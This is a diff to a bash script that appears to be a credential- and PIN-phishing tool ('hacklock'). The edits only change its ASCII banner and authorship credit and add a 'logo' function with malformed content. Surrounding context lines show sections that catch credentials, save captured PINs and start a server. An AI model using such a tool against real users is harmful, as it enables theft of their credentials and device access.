@@ -146,16 +146,16 @@ fi
 ####### Banner for interface #######
 banner() {
 printf "\n"
-
-                          É O BLK NÉ VIDA!
-    printf"            \___________________/
-                        _/_|____________|_\_
-                        /⭕⭕________⭕⭕\
-                        |_/____BLK-033____\_|
-                        \💥💥||______||💥💥/"
-
-[By GHOSTSZZ_]
-printf "                        \e[104m\e[1;77m  >>  IG ghostszz_ << \e[0m\n"
+printf "\e[1;92m  _|    _|                      _|        _|                            _|\e[0m\n"
+printf "\e[1;92m  _|    _|    _|_|_|    _|_|_|  _|  _|    _|          _|_|      _|_|_|  _|  _| \e[0m\n"
+printf "\e[1;92m  _|_|_|_|  _|    _|  _|        _|_|      _|        _|    _|  _|        _|_\e[0m\n"
+printf "\e[1;92m  _|    _|  _|    _|  _|        _|  _|    _|        _|    _|  _|        _|  _|\e[0m\n"
+printf "\e[1;92m  _|    _|    _|_|_|    _|_|_|  _|    _|  _|_|_|_|    _|_|      _|_|_|  _|    _| v2.0 \e[0m\n"
+printf "\n"
+printf "                        \e[104m\e[1;77m  >>  Script By N17R0 << \e[0m\n"
+printf "\n"
+printf "                 \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Noob Hackers \e[100m\e[1;77m << \e[0m\n"
+printf "\n"
 }
 
 ####### Catch creds #######
@@ -168,7 +168,17 @@ printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m core/main/save
 printf "\n"
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting For Next Pin, Press Ctrl + C to exit...\e[0m\n"
 }
+logo(){
 
+
+
+
+BLK!!!
+
+
+
+
+}
 ####### Server start/run #######
 start() {
 if [[ -e "$HOME/hacklock/core/pattern/ip.txt" ]]; then
@@ -274,6 +284,6 @@ done
 }
 
 ####### Restart the tool #######
-banner
+logo
 dependencies
 menu
